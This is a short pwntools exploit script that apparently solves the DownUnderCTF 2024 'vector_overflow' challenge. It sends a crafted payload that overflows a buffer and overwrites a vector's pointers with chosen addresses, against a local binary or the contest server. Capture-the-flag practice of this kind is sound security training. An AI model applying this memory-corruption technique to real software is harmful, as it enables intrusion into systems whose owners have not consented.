from pwn import *

from pwn import *

gs = '''
break *main+73
continue
'''

elf = context.binary = ELF("./vector_overflow")

def start():
    if args.REMOTE:
        return remote("2024.ductf.dev", 30013)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()
#(0x4051e0)
#b"\xe0\x51\x40"
payload = b"".join([
    b"DUCTF",
    b"A"*11,
    p64(0x4051e0),
    p64(0x4051e0 + 5),
    p64(0x4051e0 + 5)
    
])

io.sendline(payload)

io.interactive()